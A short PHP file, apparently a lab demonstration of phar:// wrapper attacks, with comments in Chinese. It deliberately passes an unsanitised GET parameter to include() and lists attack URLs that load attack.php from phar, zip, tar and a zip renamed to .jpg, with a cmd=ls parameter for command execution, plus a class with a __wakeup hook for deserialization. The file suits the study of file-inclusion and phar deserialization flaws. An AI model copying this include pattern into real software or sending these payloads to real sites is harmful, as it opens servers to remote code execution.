<?php
    class Cat { 
        function __wakeup() { echo "__wakeup\n"; }
    }
    echo file_get_contents('phar://pharfile.phar/meow.txt');
    include($_GET['url']);
    // ?url=phar://pharfile.phar/code.txt  會顯示 ls 結果
    // ?url=phar://a.zip/attack.php&cmd=ls
    // ?url=phar://a.jpg/attack.php&cmd=ls  # cp a.zip a.jpg
    // ?usr=phar://a.tar/tmp/attack.php

    // 法一: 用 create_phar
    // 法二: 用 zip  // zip a.zip attack.php
    // 法三: 用 tar  // tar cvf a.tar ./tmp
?>
